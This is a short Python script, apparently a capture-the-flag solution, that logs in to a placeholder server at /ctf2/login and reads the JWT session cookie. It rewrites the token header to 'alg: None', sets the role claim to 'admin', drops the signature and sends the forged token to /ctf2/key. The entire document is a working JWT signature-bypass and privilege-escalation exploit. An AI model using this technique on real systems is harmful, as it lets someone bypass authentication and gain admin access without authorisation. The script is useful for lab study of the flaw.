import requests
import os
import sys
import base64
import subprocess
import ast
import json
import re

def decode_base64(data, altchars=b'+/'):
    missing_padding = 4 - len(data) % 4
    if missing_padding:
        data += b'='* missing_padding
    return base64.urlsafe_b64decode(data)

def main():

    ses = requests.Session()

    url = "http://<server-ip>/ctf2/login"
    headers = {'Content-Type': "application/json",'User-Agent':"Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"}    
    payload = "{\n\t\"username\": \"insertUsername\",\n\t\"password\": \"insertPassword\"\n}" 
    response = ses.post(url, data=payload, headers=headers)

    cookieJar = ses.cookies
    for cookie in cookieJar:
        print(cookie.value)

    strings=cookie.value.split(".")
    url1 = "http://<server-ip>/ctf2/key"
    ses.headers.update({'X-Auth-Token': cookie.value})

    heads = decode_base64(strings[0])
    response_dict = ast.literal_eval(heads)
    response_dict["alg"] = "None"
    mod_header_elem = json.dumps(response_dict) # Modified header

    payload = decode_base64(strings[1])
    res_dict = ast.literal_eval(payload)
    res_dict["role"] = "admin"
    mod_token_elem = json.dumps(res_dict)
     
    mod_token_elem = mod_token_elem[:38]+"}" # Modified token

    en_header = ''.join(base64.urlsafe_b64encode(mod_header_elem).split("\n")) # Base64 encode
    en_token = ''.join(base64.urlsafe_b64encode(mod_token_elem).split("\n"))  # Base64 encode
	
    newPipe = decode_base64(en_header)
   
    strings[0] = en_header
    strings[1] = en_token
    new_cookie =  strings[0]+"."+strings[1]+"." # New Cookie

    print(new_cookie)
     
    ses.headers.update({'X-Auth-Token': new_cookie})
    response = ses.get(url1)
    print(response.text)
      
if __name__ == "__main__":
	main()
